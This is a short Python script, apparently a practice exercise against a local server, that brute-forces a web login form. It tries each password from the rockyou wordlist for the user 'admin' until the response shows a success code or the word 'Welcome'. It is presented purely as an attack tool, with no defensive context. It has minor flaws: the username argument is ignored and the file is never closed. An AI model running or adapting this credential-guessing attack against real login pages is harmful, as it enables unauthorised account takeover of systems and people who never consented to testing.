import requests
from requests import status_codes

def try_login(password, url, success_code, success_string):
    r = requests.post(url, data={'uname': 'admin', 'pword': password})
    if r.status_code == success_code:
        return True
    elif r.text.find(success_string) != -1:
        return True
    else:
        return False

def password_crack(pwFile, url, user, success_code, success_substring):
    afile = open(pwFile, 'r')

    for line in afile:
        currPW = line.strip()
        if try_login(currPW, url, success_code, success_substring):
            print("The password is: " + currPW)
            break
        
    print("Completed.")
    afile.close

password_crack("rockyou.txt", 'http://127.0.0.1:8000/login.html', 'admin', 302, 'Welcome')